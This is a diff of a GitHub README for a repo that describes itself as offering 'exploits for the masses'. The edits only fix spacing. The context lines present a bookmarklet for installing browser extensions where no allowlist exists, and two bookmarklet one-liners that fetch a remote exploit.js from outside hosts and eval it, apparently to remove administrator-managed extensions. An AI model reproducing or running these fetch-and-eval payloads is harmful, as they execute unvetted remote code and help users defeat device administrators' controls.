@@ -10,7 +10,7 @@ Hello, I am Echo and I created this repo in order to give exploits for the masse
 <img width="250px" src="https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png">  
 Image Credit: LittleMissNyan
 <details>
-<summary><b> Extension Launcher(Bookmarklet) </summary>
+<summary><b> Extension Launcher (Bookmarklet) </summary>
 A bookmarklet capable of installing extensions, for those without a allowlist. 
 
 Steps: 
@@ -100,7 +100,7 @@ There are several vesions of this exploit you can use, here are the 2 most commo
     ```js
     javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
     ```  
-    -Compact Cow's UI (Dark)
+    - Compact Cow's UI (Dark)
     ```js
     javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
     ```
